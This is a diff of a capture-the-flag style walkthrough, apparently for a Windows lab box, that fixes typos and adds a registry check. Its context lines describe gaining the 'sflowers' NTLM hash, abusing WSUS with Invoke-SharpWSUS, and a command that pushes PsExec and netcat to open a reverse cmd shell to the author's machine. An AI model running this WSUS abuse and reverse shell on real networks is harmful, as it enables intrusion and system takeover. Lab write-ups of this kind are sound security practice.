@@ -369,7 +369,7 @@ Moved the script into the box & invoked the whisper script then used the similar
         
 ![image](https://user-images.githubusercontent.com/87700008/208775012-3c6f1f15-fa55-4558-967b-f136c2a70743.png)
 
-Ran this key & got the "sflowe" NTLM hash :
+Ran this key & got the "sflowers" NTLM hash :
 
            ______        _
           (_____ \      | |                     
@@ -462,6 +462,9 @@ As per the blog we can compromise the system if the updates are not requested us
 ![image](https://user-images.githubusercontent.com/87700008/208898052-67f77f06-1c72-4557-ad09-ab3c7e365be9.png)
  
 And if HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer is equals to 1.
+
+        Get-ItemProperty HKLM:\software\policies\microsoft\windows\WindowsUpdate
+        
 ![image](https://user-images.githubusercontent.com/87700008/208898554-00d00132-6af0-436b-a185-c4854125b920.png)
 
 I was checking for the steps to exploit & landed into these websites, ref : https://labs.nettitude.com/blog/introducing-sharpwsus/ , https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Active%20Directory%20Attack/#wsus-deployment
@@ -471,7 +474,7 @@ I was checking for the steps to exploit & landed into these websites, ref : http
 
 So, I followed the steps to root the box & used the PowerShell script of SharpWSUS, which I downloaded from : https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
-Then I transferred the file "Invoke-SharpWsus.ps1" into the box & invoked the script first, after the SharpWsus is working fine.
+Then I transferred the file "Invoke-SharpWsus.ps1" into the box & invoked the script first, after that SharpWsus is working fine.
 
 ![image](https://user-images.githubusercontent.com/87700008/208944247-84d6ad03-b562-4da6-90b9-1a300019d5b9.png)
 
@@ -481,7 +484,7 @@ Then to check the further information about the clients using the WSUS I ran thi
         
 ![image](https://user-images.githubusercontent.com/87700008/208945092-5720525c-7061-4ddc-9db2-e992d272d8da.png)
 
-After that I used ran this command with SharpWsus to perform the update with the netcat binary (I transferred into the machine) & run a specific command with netcat to connect back to my kali machine :
+After that I ran this command with SharpWsus to perform the update with the netcat binary (I transferred into the machine) & run a specific command with netcat to connect back to my kali machine :
 
         Invoke-SharpWsus create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d C:\Users\sflowers\Desktop\nc64.exe -e cmd.exe my_ip lport" /title:"Shell"
         
